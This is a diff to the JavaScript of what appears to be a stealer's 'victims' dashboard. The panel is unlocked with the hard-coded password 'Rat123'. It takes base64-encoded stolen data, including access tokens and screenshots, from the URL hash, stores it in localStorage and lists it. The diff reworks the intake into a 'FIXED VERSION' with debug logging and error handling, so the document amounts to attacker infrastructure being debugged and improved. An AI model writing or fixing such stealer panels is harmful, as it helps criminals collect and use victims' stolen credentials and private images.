@@ -467,21 +467,29 @@
         // Password protection
         const CORRECT_PASSWORD = "Rat123";
         
-        // Store victim data (in production this would be fetched from server)
+        // Store victim data
         let victimsData = [];
         
         // Load saved data from localStorage
         function loadSavedData() {
-            const saved = localStorage.getItem('victimsData');
-            if (saved) {
-                victimsData = JSON.parse(saved);
-                updateDashboard();
+            try {
+                const saved = localStorage.getItem('victimsData');
+                if (saved) {
+                    victimsData = JSON.parse(saved);
+                    updateDashboard();
+                }
+            } catch (e) {
+                console.log('Error loading saved data:', e);
             }
         }
         
         // Save data to localStorage
         function saveData() {
-            localStorage.setItem('victimsData', JSON.stringify(victimsData));
+            try {
+                localStorage.setItem('victimsData', JSON.stringify(victimsData));
+            } catch (e) {
+                console.log('Error saving data:', e);
+            }
         }
         
         // Check password function
@@ -498,7 +506,7 @@
                     document.getElementById('loginContainer').style.display = 'none';
                     document.getElementById('dashboardContainer').style.display = 'block';
                     loadSavedData();
-                    startDataCollection();
+                    checkForData();
                 }, 1000);
             } else {
                 errorMsg.style.display = 'block';
@@ -522,50 +530,61 @@
             document.getElementById('successMessage').style.display = 'none';
         }
         
-        // Start collecting data (simulated for demo)
-        function startDataCollection() {
-            // Check URL for parameters (would be from stealer)
-            const urlParams = new URLSearchParams(window.location.search);
-            if (urlParams.has('data')) {
-                try {
-                    const receivedData = JSON.parse(atob(urlParams.get('data')));
-                    addVictimData(receivedData);
-                } catch (e) {
-                    console.log('Invalid data format');
-                }
-            }
+        // Check for data in URL (FIXED VERSION)
+        function checkForData() {
+            console.log('Checking for data...');
+            console.log('Full URL:', window.location.href);
+            console.log('Hash:', window.location.hash);
             
-            // Set up endpoint for receiving data
-            setupEndpoint();
-        }
-        
-        // Setup endpoint to receive data
-        function setupEndpoint() {
-            // Check for POST data in URL hash (simplified for static hosting)
-            window.addEventListener('hashchange', function() {
-                const hash = window.location.hash.substring(1);
-                if (hash) {
-                    try {
-                        const data = JSON.parse(decodeURIComponent(hash));
-                        addVictimData(data);
-                        window.location.hash = '';
-                    } catch (e) {}
-                }
-            });
-            
-            // Check initial hash
+            // Check if there's a hash
             if (window.location.hash) {
-                const hash = window.location.hash.substring(1);
-                try {
-                    const data = JSON.parse(decodeURIComponent(hash));
-                    addVictimData(data);
-                    window.location.hash = '';
-                } catch (e) {}
+                const hash = window.location.hash.substring(1); // Remove the #
+                console.log('Hash content:', hash);
+                
+                // The format is: #password?encodedData
+                const questionMarkIndex = hash.indexOf('?');
+                
+                if (questionMarkIndex !== -1) {
+                    const passwordFromUrl = hash.substring(0, questionMarkIndex);
+                    const encodedData = hash.substring(questionMarkIndex + 1);
+                    
+                    console.log('Password from URL:', passwordFromUrl);
+                    console.log('Encoded data length:', encodedData.length);
+                    
+                    // Verify password
+                    if (passwordFromUrl === CORRECT_PASSWORD) {
+                        try {
+                            // Decode the base64 data
+                            const decodedData = atob(encodedData);
+                            console.log('Decoded data:', decodedData);
+                            
+                            // Parse JSON
+                            const data = JSON.parse(decodedData);
+                            console.log('Parsed data:', data);
+                            
+                            // Add to victims
+                            addVictimData(data);
+                            
+                            // Clear the hash to prevent reprocessing
+                            window.location.hash = '';
+                        } catch (e) {
+                            console.error('Error parsing data:', e);
+                        }
+                    } else {
+                        console.log('Password mismatch');
+                    }
+                } else {
+                    console.log('No ? in hash');
+                }
+            } else {
+                console.log('No hash found');
             }
         }
         
         // Add victim data
         function addVictimData(data) {
+            console.log('Adding victim data:', data);
+            
             const newData = {
                 ...data,
                 id: Date.now() + Math.random().toString(36).substr(2, 9),
@@ -599,7 +618,7 @@
             const tokens = victimsData.filter(v => v.access_token).length;
             document.getElementById('totalTokens').textContent = tokens;
             
-            const screenshots = victimsData.filter(v => v.recent_screenshots).length;
+            const screenshots = victimsData.filter(v => v.recent_screenshots && v.recent_screenshots.length > 0).length;
             document.getElementById('totalScreenshots').textContent = screenshots;
         }
         
@@ -698,6 +717,9 @@
             const data = document.getElementById('modalJson').textContent;
             navigator.clipboard.writeText(data).then(() => {
                 alert('Data copied to clipboard');
+            }).catch(err => {
+                console.error('Failed to copy:', err);
+                alert('Failed to copy data');
             });
         }
         
@@ -755,6 +777,7 @@
         
         // Load data on page load
         window.onload = function() {
+            console.log('Page loaded');
             loadSavedData();
         };
         
